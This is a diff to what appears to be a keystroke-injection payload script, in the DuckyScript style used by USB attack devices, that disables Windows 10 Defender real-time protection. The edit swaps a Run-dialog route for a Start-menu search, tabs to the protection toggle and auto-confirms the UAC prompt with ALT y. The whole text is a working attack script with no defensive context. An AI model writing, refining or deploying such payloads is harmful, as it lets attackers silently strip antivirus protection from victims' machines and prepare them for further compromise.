@@ -1,14 +1,13 @@
 REM Temporarily disable Windows 10 Defender (Realtime protection)
+
 DELAY 1000
-GUI r
-STRING windowsdefender:///
+GUI
+STRING virus and threat
 ENTER
-ENTER
-DOWN
-DOWN
-DOWN
-DOWN
-DOWN
+TAB
+TAB
+TAB
+TAB
 ENTER
 SPACE
 ALT y
